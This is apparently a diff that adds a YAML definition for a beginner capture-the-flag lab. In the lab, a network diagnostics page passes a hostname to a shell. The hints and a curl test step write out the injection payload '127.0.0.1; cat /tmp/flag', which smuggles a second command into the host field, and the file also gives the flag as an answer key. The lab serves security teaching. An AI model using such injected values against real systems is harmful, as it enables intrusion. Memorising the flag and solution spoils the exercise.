@@ -1,0 +1,89 @@
+name: "Diagnostics Command Injection"
+description: "A browser-only command-injection starter for the DevFest software-security track. A small network diagnostics page passes a hostname to a shell. Find the injection point and read the flag, then explain how to remove the shell safely."
+difficulty: beginner
+category: exploitation
+duration_minutes: 15
+visibility: public
+flag: "OCR{sh3ll_1nj3ct10n_1s_4_bug}"
+
+tools:
+  - browser
+
+objectives:
+  - Identify untrusted input flowing into a shell
+  - Run a benign lookup and observe the command output
+  - Use a shell separator to read the flag file
+  - Explain how to fix the bug with argument arrays and allowlisting
+
+scenario: |
+  The DevFest volunteer team added a small diagnostics page to check that
+  conference network names resolve. It accepts a hostname and prints the
+  lookup result.
+
+  The page was written quickly. The developer passed the visitor's input to a
+  shell command, so a separator can turn one lookup into two commands.
+
+  This is a safe, fictional target in an isolated lab container. You do not
+  need a terminal: the page shows the command output in your browser. The flag
+  is a training value, and the container is read-only with all capabilities
+  dropped.
+
+workbook: "wiki/range/software-security/CH_SWSEC_Software_Security/02_Diagnostics_Command_Injection/"
+
+hostnames:
+  - ip_offset: "92"
+    hostname: "diag.lab"
+    description: "DevFest diagnostics page (HTTP 8080)"
+
+topology:
+  nodes:
+    - id: "diagnostics"
+      label: "DevFest diagnostics page"
+      type: "server"
+      ip_offset: "92"
+      ports: [8080]
+      services: ["http"]
+      x: 1
+      y: 1
+
+hints:
+  - text: |
+      Open http://diag.lab:8080 in the lab browser. Try the default lookup for
+      127.0.0.1. The result is the output of a command run by the server.
+    unlock_after_minutes: 0
+
+  - text: |
+      The page probably builds a shell command like:
+
+      getent hosts <your input>
+
+      In a shell, a semicolon separates commands. Try adding a second command
+      after a normal hostname.
+    unlock_after_minutes: 4
+
+  - text: |
+      The training flag is in /tmp/flag inside the target container. Try this
+      value in the host field:
+
+      127.0.0.1; cat /tmp/flag
+
+      The lookup result should include the flag. Ask a facilitator if you are
+      stuck; using a hint is expected.
+    unlock_after_minutes: 8
+
+test:
+  steps:
+    - name: "Diagnostics page responds"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.diagnostics}:8080/"
+      expect: "200"
+      timeout: 20
+
+    - name: "Normal lookup responds"
+      command: "curl -s -o /dev/null -w '%{http_code}' 'http://{target.diagnostics}:8080/lookup?host=127.0.0.1'"
+      expect: "200"
+      timeout: 20
+
+    - name: "Injected command returns the flag"
+      command: "curl -s 'http://{target.diagnostics}:8080/lookup?host=127.0.0.1%3Bcat%20/tmp/flag' | grep -o 'OCR{[^}]*}'"
+      expect: "OCR{sh3ll_1nj3ct10n_1s_4_bug}"
+      timeout: 20
